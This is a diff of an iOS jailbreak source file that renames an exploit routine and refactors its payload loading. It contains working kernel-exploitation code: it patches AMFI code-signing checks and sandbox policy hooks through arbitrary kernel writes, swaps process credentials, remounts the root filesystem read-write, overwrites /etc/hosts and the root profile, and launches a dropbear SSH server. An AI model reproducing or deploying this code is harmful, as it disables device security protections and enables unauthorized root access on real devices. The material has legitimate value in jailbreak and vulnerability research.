@@ -28,11 +28,9 @@
 #import <sys/utsname.h>
 
 #import "patchfinder64.h"
-
-#import "getshell.h"
-
-#import "set.h";
 #import "common.h"
+
+#import "libjb.h"
 
 #define vm_address_t mach_vm_address_t
 
@@ -44,6 +42,9 @@ kern_return_t mach_vm_read_overwrite(vm_map_t target_task, mach_vm_address_t add
 kern_return_t mach_vm_write(vm_map_t target_task, mach_vm_address_t address, vm_offset_t data, mach_msg_type_number_t dataCnt);
 kern_return_t mach_vm_protect(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, boolean_t set_maximum, vm_prot_t new_protection);
 kern_return_t mach_vm_allocate(vm_map_t target, mach_vm_address_t *address, mach_vm_size_t size, int flags);
+
+kern_return_t remount_rw(uint64_t kernbase);
+kern_return_t load_payload();
 
 uint32_t FuncAnywhere32(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2)
 {
@@ -101,7 +102,7 @@ uint64_t WriteAnywhere32(uint64_t addr, uint32_t val) {
 
 #import "pte_stuff.h"
 
-void exploit(void* btn, mach_port_t pt, uint64_t kernbase, uint64_t allprocs)
+void jailbreak(mach_port_t pt, uint64_t kernbase, uint64_t allprocs)
 {
     io_iterator_t iterator;
     IOServiceGetMatchingServices(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"), &iterator);
@@ -548,10 +549,10 @@ remappage[remapcnt++] = (x & (~PMK));\
     
     RemapPage(release+whole_base);
     if (NewPointer(release+whole_base) == (NewPointer(release+whole_base+11) - 11)) {
-        copyout(NewPointer(release+whole_base), "MarijuanARM", 11); /* marijuanarm */
+        copyout(NewPointer(release+whole_base), "hongs", 11); /* marijuanarm */
     }
-
-  
+    
+    
     /*
      nonceenabler
      */
@@ -572,17 +573,63 @@ remappage[remapcnt++] = (x & (~PMK));\
         }
     }
     
+    /*
+     sandbox
+     */
+    /*
+     uint64_t sbops = find_sbops();
+     uint64_t sbops_end = sbops + sizeof(struct mac_policy_ops) + PMK;
+     
+     uint64_t nopag = (sbops_end - sbops)/(PSZ);
+     
+     for (int i = 0; i < nopag; i++) {
+     RemapPage(((sbops + i*(PSZ)) & (~PMK)));
+     }
+     
+     WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_file_check_mmap)), 0);
+     WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_rename)), 0);
+     WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_rename)), 0);
+     WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_access)), 0);
+     WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_chroot)), 0);
+     WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_create)), 0);
+     WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_deleteextattr)), 0);
+     WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_exchangedata)), 0);
+     WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_exec)), 0);
+     WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_getattrlist)), 0);
+     WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_getextattr)), 0);
+     WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_ioctl)), 0);
+     WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_link)), 0);
+     WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_listextattr)), 0);
+     WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_open)), 0);
+     WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_readlink)), 0);
+     WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setattrlist)), 0);
+     WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setextattr)), 0);
+     WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setflags)), 0);
+     WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setmode)), 0);
+     WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setowner)), 0);
+     WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setutimes)), 0);
+     WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setutimes)), 0);
+     WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_stat)), 0);
+     WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_truncate)), 0);
+     WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_unlink)), 0);
+     WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_notify_create)), 0);
+     WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_fsgetpath)), 0);
+     WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_getattr)), 0);
+     WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_mount_check_stat)), 0);
+     
+     */
+    
     // amfi patch
     {
         uint64_t memcmp_got = find_amfi_memcmpstub();
         uint64_t ret1 = find_ret_0();
-  
+        
         RemapPage(memcmp_got);
         WriteAnywhere64(NewPointer(memcmp_got), ret1);
-  
+        
         uint64_t fref = find_reference((uint32_t*)get_data_for_mode(0, SearchTextExec), text_exec_size, text_exec_base, idlesleep_handler+0xC) + text_exec_base;
         NSLog(@"fref at %llx", fref);
-  
+        
         uint64_t find_string_reference(char* string, enum Search mode);
         uint64_t amfiops = 0;
         //= find_string_reference("Apple Mobile File Integrity", SearchPrelinkExec);
@@ -593,27 +640,27 @@ remappage[remapcnt++] = (x & (~PMK));\
                 break;
             }
         }
-  
+        
         NSLog(@"amfistr at %llx", amfiops);
-  
-  
+        
+        
         {
             /*
              amfi
              */
-          
+            
             uint64_t sbops = amfiops;
             uint64_t sbops_end = sbops + sizeof(struct mac_policy_ops);
-          
+            
             uint64_t nopag = sbops_end - sbops;
-          
+            
             for (int i = 0; i < nopag; i+= PSZ) {
                 RemapPage(((sbops + i) & (~PMK)));
             }
             WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_file_check_mmap)), 0);
         }
-  
-  
+        
+        
         /*
          first str
          */
@@ -623,15 +670,15 @@ remappage[remapcnt++] = (x & (~PMK));\
                 int32_t outhere = ((opcode & 0x3FFC00) >> 10) * 8;
                 int32_t myreg = (opcode >> 5) & 0x1f;
                 uint64_t rgz = find_register_value((uint32_t*)get_data_for_mode(0, SearchTextExec), fref-gadget_base, text_exec_base, myreg)+outhere;
-              
+                
                 WriteAnywhere64(rgz, physcode+0x200);
                 break;
             }
             fref += 4;
         }
-  
+        
         fref += 4;
-  
+        
         /*
          second str
          */
@@ -641,128 +688,128 @@ remappage[remapcnt++] = (x & (~PMK));\
                 int32_t outhere = ((opcode & 0x3FFC00) >> 10) * 8;
                 int32_t myreg = (opcode >> 5) & 0x1f;
                 uint64_t rgz = find_register_value((uint32_t*)get_data_for_mode(0, SearchTextExec), fref-gadget_base, text_exec_base, myreg)+outhere;
-              
+                
                 WriteAnywhere64(rgz, physcode+0x100);
                 break;
             }
             fref += 4;
         }
-  
-  
         {
             uint64_t point = find_amfiret()-0x18;
-          
+            
             RemapPage((point & (~PMK)));
             uint64_t remap = NewPointer(point);
-          
+            
             assert(ReadAnywhere32(point) == ReadAnywhere32(remap));
-          
+            
             WriteAnywhere32(remap, 0x58000041);
             WriteAnywhere32(remap + 4, 0xd61f0020);
             WriteAnywhere64(remap + 8, shc+0x200); /* amfi shellcode */
-          
+            
         }
-  
+        
         for (int i = 0; i < z; i++) {
             WriteAnywhere64(plist[i], physcode + 0x100);
         }
-  
+        
         while (ReadAnywhere32(kernvers+whole_base-4) != 1) {
             sleep(1);
         }
-  
+        
         NSLog(@"enabled patches");
-  
-    }
-  
-  
-     // remount root partition r/W
-    {
-      
-        extern uint64_t rootvnode_offset;
-        uint64_t rootfs_vnode = ReadAnywhere64(rootvnode_offset + kernbase);
         
-        struct utsname uts;
-        uname(&uts);
-        
-        vm_offset_t off = 0xd8;
-        if (strstr(uts.version, "16.0.0")) {
-            off = 0xd0;
-        }
-        
-        uint64_t v_mount = ReadAnywhere64(rootfs_vnode+off);
-        
-        uint32_t v_flag = ReadAnywhere32(v_mount + 0x71);
-        
-        WriteAnywhere32(v_mount + 0x71, v_flag & (~(0x1<<6)));
-        
-        char* nmz = strdup("/dev/disk0s1s1");
-        int lolr = mount( "hfs", "/", MNT_UPDATE, (void*)&nmz);
-        NSLog(@"remounting: %d", lolr);
-        
-        v_mount = ReadAnywhere64(rootfs_vnode+off);
-        
-        WriteAnywhere32(v_mount + 0x71, v_flag);
     }
 
-  
-    // load payload
-    {
-        char path[4096];
-        uint32_t size = sizeof(path);
-        _NSGetExecutablePath(path, &size);
-        char *pt = realpath(path, NULL);
-        
-        pid_t pd = 0;
-        NSString *execpath = [[NSString stringWithUTF8String:pt] stringByDeletingLastPathComponent];
-        
-        NSString *tar = [execpath stringByAppendingPathComponent:@"tar-sig"];
-        NSString *bash = [execpath stringByAppendingPathComponent:@"bash-arm64-sig"];
-        NSString *dropbear = [execpath stringByAppendingPathComponent:@"dropbear-sig"];
-        NSString *bootstrap = [execpath stringByAppendingPathComponent:@"bootstrap.tar"];
-        NSString *profile = [execpath stringByAppendingPathComponent:@"profile"];
-        
-        chdir("/tmp/");
-        mkdir("/etc/dropbear", 0775);
-        
-        // copy file
-        copyfile([tar UTF8String], "/tmp/tar-sig", 0, COPYFILE_ALL);
-        copyfile([bash UTF8String], "/bin/sh", 0, COPYFILE_ALL);
-        copyfile([bash UTF8String], "/tmp/bash-arm64-sig", 0, COPYFILE_ALL);
-        copyfile([dropbear UTF8String], "/tmp/dropbear-sig", 0, COPYFILE_ALL);
-        copyfile([profile UTF8String], "/var/root/.profile", 0, COPYFILE_ALL);
-        
-        //chmod
-        chmod("/tmp/tar-sig", 0755);
-        chmod("/bin/sh", 0755);
-        chmod("/tmp/bash-arm64-sig", 0755);
-        chmod("/tmp/dropbear-sig", 0755);
-    
-      
-        // exec cmd
-        posix_spawn(&pd, "/tmp/tar-sig", NULL, NULL, (char **)&(const char*[]){ "/tmp/tar-sig", "--preserve-permissions", "--no-overwrite-dir", "-xf", [bootstrap UTF8String], NULL }, NULL);
-        NSLog(@"pid = %x", pd);
-        // waitpid(pd, NULL, 0);
-        sleep(2);
-        printf("Finished unzip bootstrap.tar in /tmp \n");
-			
-				// get generator
-				get_generator();
-			
-        // get shell
-        getshell();
-      
-        //launch dropbear
-        printf("Launch dropbear on 2222 port\n");
-        posix_spawn(&pd, "/tmp/dropbear-sig", NULL, NULL, (char **)&(const char*[]){ "/tmp/dropbear-sig", "-RE", "-p", "127.0.0.1:2222",NULL }, NULL);
-        NSLog(@"pid = %x", pd);
-        waitpid(pd, NULL, 0);
-		
-      
-    }
-
+    //remount_rw(kernbase);     // remount root partition r/W
+    load_payload();     // load payload
     WriteAnywhere64(bsd_task+0x100, orig_cred);
     sleep(2);
-    
     NSLog(@"done");
+}
+
+kern_return_t remount_rw(uint64_t kernbase){
+    
+    extern uint64_t rootvnode_offset;
+    uint64_t rootfs_vnode = ReadAnywhere64(rootvnode_offset + kernbase);
+    
+    struct utsname uts;
+    uname(&uts);
+    
+    vm_offset_t off = 0xd8;
+    if (strstr(uts.version, "16.0.0")) {
+        off = 0xd0;
+    }
+    
+    uint64_t v_mount = ReadAnywhere64(rootfs_vnode+off);
+    
+    uint32_t v_flag = ReadAnywhere32(v_mount + 0x71);
+    
+    WriteAnywhere32(v_mount + 0x71, v_flag & (~(0x1<<6)));
+    
+    char* nmz = strdup("/dev/disk0s1s1");
+    int lolr = mount( "hfs", "/", MNT_UPDATE, (void*)&nmz);
+    NSLog(@"remounting: %d", lolr);
+    
+    v_mount = ReadAnywhere64(rootfs_vnode+off);
+    
+    WriteAnywhere32(v_mount + 0x71, v_flag);
+    return  0;
+}
+
+kern_return_t load_payload(){
+    char path[4096];
+    uint32_t size = sizeof(path);
+    _NSGetExecutablePath(path, &size);
+    char *pt = realpath(path, NULL);
+    
+    pid_t pd = 0;
+    NSString *execpath = [[NSString stringWithUTF8String:pt] stringByDeletingLastPathComponent];
+    
+   // NSString *tar = [execpath stringByAppendingPathComponent:@"tar-sig"];
+    NSString *bash = [execpath stringByAppendingPathComponent:@"bash-arm64-sig"];
+    NSString *dropbear = [execpath stringByAppendingPathComponent:@"dropbear-sig"];
+    NSString *bootstrap = [execpath stringByAppendingPathComponent:@"bootstrap.tar"];
+    NSString *profile = [execpath stringByAppendingPathComponent:@"profile"];
+    NSString *hosts = [execpath stringByAppendingPathComponent:@"hosts"];
+    
+    chdir("/tmp");
+    mkdir("/tmp/etc", 0775);
+    mkdir("/tmp/etc/dropbear", 0775);
+    
+    // copy file
+    // copyfile([tar UTF8String], "/tmp/tar-sig", 0, COPYFILE_ALL);
+    //copyfile([bash UTF8String], "/bin/sh", 0, COPYFILE_ALL);
+    copyfile([bash UTF8String], "/tmp/bash-arm64-sig", 0, COPYFILE_ALL);
+    copyfile([dropbear UTF8String], "/tmp/dropbear-sig", 0, COPYFILE_ALL);
+    copyfile([profile UTF8String], "/var/root/.profile", 0, COPYFILE_ALL);
+    copyfile([hosts UTF8String], "/etc/hosts", 0, COPYFILE_ALL);
+    
+    //chmod
+    //chmod("/tmp/tar-sig", 0755);
+    //  chmod("/bin/sh", 0755);
+    chmod("/tmp/bash-arm64-sig", 0755);
+    chmod("/tmp/dropbear-sig", 0755);
+    
+    
+    // exec cmd
+    /*
+     posix_spawn(&pd, "/tmp/tar-sig", NULL, NULL, (char **)&(const char*[]){ "/tmp/tar-sig", "--preserve-permissions", "--no-overwrite-dir", "-xf", [bootstrap UTF8String], NULL }, NULL);
+     NSLog(@"pid = %x", pd);
+     waitpid(pd, NULL, 0);
+     sleep(1);
+     printf("Finished unzip bootstrap.tar in /tmp \n");
+     */
+    printf("untar and drop bootstrap.tar into /tmp\n");
+    FILE *a = fopen([bootstrap UTF8String], "rb");
+    chdir("/tmp");
+    untar(a, "bootstrap");
+    fclose(a);
+    
+    
+    //launch dropbear
+    printf("Launch dropbear on 2222 port\n");
+    posix_spawn(&pd, "/tmp/dropbear-sig", NULL, NULL, (char **)&(const char*[]){ "/tmp/dropbear-sig", "-RE", "-p", "127.0.0.1:2222",NULL }, NULL);
+    NSLog(@"pid = %x", pd);
+    waitpid(pd, NULL, 0);
+    return 0;
 }
